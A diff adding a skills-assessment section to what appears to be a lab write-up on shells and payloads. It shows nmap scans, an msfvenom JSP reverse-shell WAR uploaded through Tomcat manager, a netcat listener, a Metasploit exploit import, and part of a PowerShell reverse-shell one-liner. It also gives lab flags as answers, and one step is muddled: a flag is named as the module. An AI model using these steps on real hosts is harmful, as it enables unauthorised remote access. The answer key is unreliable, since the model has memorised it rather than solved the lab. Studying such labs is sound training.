@@ -11,6 +11,7 @@
     1. [Laudanum, One Webshell to Rule Them All](#laudanum-one-webshell-to-rule-them-all)
     2. [Antak Webshell](#antak-webshell)
     3. [PHP Web Shells](#php-web-shells)
+5. [Skill Assesment](#skills-assessment)
 
 ## Shell Basics
 ### Anatomy of a Shell
@@ -193,3 +194,81 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.
 
     We can solve this by using `webshell.php` from wwwolf. First we need to open our burpsuite. Then we intercept it when we add the vendor. In the burpsuit, change content type of file to image/gif. Then forward it. After successfuly uploaded, click image in the new tab of our uploaded file. Then we type `ls`. The answer is `ajax-loader.gif`. 
 
+## Skills Assessment
+1. What is the hostname of Host-1? (Format: all lower case)
+
+    We can solve this by using nmap.
+
+    ```bash
+    sudo nmap 172.16.1.11 -sV -sC
+    ```
+
+    ![alt text](assets/FA1.png)
+
+    The answer is `SHELLS-WINSVR`.
+
+2. Exploit the target and gain a shell session. Submit the name of the folder located in C:\Shares\ (Format: all lower case)
+
+    From the previous output, we can get that port 8080 is running apache tomcat 10.0.11. Because apache is JAVA programming language, we tried to generate JAVA payload.
+
+    ```bash
+    msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.1.5 LPORT=443 -f war -o shell.war
+    ``` 
+
+    Then we need to set up the netcat listener
+
+    ```bash
+    sudo nc -lvnp 443
+    ```
+
+    After that we open the browser and go to `http://172.16.1.11:8080/manager/html` by using given credential to login. Then we upload shell.war and execute it. We can explore from there. The answer is `dev-share`.
+
+3. What distribution of Linux is running on Host-2? (Format: distro name, all lower case)
+
+    We can solve this by using nmap.
+
+    ```bash
+    sudo nmap blog.inlanefreight.local -sV -sC
+    ```
+
+    ![alt text](assets/FA2.png)
+
+    The answer is `ubuntu`.
+
+4. What language is the shell written in that gets uploaded when using the 50064.rb exploit?
+
+    We can solve this by go to the website, it have article related to the blog.
+
+    ![alt text](assets/FA3.png)
+
+    The answer 0s `php`.
+
+5. Exploit the blog site and establish a shell session with the target OS. Submit the contents of /customscripts/flag.txt
+
+    To solve this, we need to import 50064.rb to our metasploit. First we need to find the location of it. 
+
+    ![alt text](assets/FA4.png)
+
+    Then we copy it to metasploit exploit directory. After that we open metasploit and run `reload_all`. Then we use the imported payload. 
+
+    ```bash
+    use /exploit/50064.rb
+    ```
+    Then we run `show options` to see the required data. After that we fill it like this.
+
+    ![alt text](assets/FA5.png)
+
+    We can run it then and we will get the shell. We can explore from there. The answer is `B1nD_Shells_r_cool`.
+
+6. What is the hostname of Host-3?
+
+    We can solve this by using nmap.
+
+    ```bash
+    sudo nmap 172.16.1.13 -sV -sC
+    ```
+    The answer is `SHELLS-WINBLUE`.
+
+7. Exploit and gain a shell session with Host-3. Then submit the contents of C:\Users\Administrator\Desktop\Skills-flag.txt
+
+    We can solve this by using metasploit `0ne-H0st-Down!` module. The answer is `One-H0st-Down!`.
